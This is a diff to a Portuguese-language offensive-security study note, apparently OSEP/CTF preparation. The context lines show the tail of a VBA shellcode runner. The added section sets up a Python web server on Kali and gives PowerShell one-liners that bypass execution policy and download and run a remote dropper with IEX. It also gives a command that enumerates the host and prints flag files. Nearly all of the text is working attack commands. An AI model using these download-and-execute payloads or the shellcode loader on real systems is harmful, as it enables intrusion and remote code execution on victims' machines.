@@ -372,7 +372,61 @@ Sub Main()
         RtlMoveMemory addr + i, data, 1
     Next i
 
+
+
     CreateThread 0, 0, addr, 0, 0, 0
 End Sub
 ```
+
+## Webserve em Python para dropper
+
+Creação do diretório:
+```
+sudo mkdir /opt/tools
+```
+
+Atribuindo permissões ao usuário:
+```
+sudo chown -R kali:kali /opt/tools
+```
+
+Baixando o server:
+```
+wget https://raw.githubusercontent.com/thiagosmith/OSEP-Study/refs/heads/main/Scripts/simple_server.py -o /opt/tools/server.py
+```
+
+Execução do server:
+```
+python /opt/tools/server.py /opt/tools/
+```
+Saída:
+```
+[+] File server base from: /opt/tools
+[+] Web server runing on 0.0.0.0:80
+```
+
+Chamada do dropper:
+```
+powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.xxx.xxx/dropper')"
+```
+
+Pesquisar e exibir as flag:
+```
+echo "`n========== BASIC ENUM =========="; echo "`n[+] Current User:"; whoami; echo "`n[+] Hostname:"; hostname; echo "`n[+] Network:"; ipconfig; echo "`n========== FLAGS =========="; Get-ChildItem C:\ -Include local.txt,proof.txt,secret.txt -File -Recurse -ea 0 | % { echo "`n[+] Flag File:$($_.FullName)"; gc $_.FullName }
+```
+
+
+Chamada da flag:
+```
+powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.xxx.xxx/flag')"
+```
+
+
+
+
+
+
+
+
+
 
